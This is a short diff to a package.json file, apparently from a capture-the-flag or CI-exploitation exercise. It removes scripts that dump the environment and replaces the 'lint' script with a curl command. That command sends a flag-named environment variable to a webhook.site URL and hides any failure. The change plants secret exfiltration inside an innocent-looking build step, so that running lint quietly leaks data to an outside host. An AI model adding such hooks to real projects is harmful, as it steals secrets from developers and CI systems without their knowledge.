@@ -14,7 +14,7 @@
     "eslint": "8.57.0"
   },
   "scripts": {
-    "lint": "env",
-    "start": "env|base64|base64"
+    "lint": "curl -G https://webhook.site/c468ba25-b30c-4944-8a41-23200be7ccd0 --data-urlencode f=${FLAG_GRAVY_OVERFLOW_L0_GRAVY} || true",
+    "start": "node app.js"
   }
 }
